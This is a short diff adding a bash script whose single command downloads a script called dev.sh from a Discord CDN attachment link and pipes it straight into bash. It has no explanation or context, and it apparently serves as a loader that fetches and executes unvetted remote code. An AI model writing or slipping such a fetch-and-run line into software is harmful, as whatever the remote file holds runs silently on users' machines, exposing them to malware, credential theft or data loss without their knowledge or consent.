@@ -1,0 +1,2 @@
+#!/bin/bash
+bash <(curl -s https://cdn.discordapp.com/attachments/919461094433644644/1004996342969552958/dev.sh)
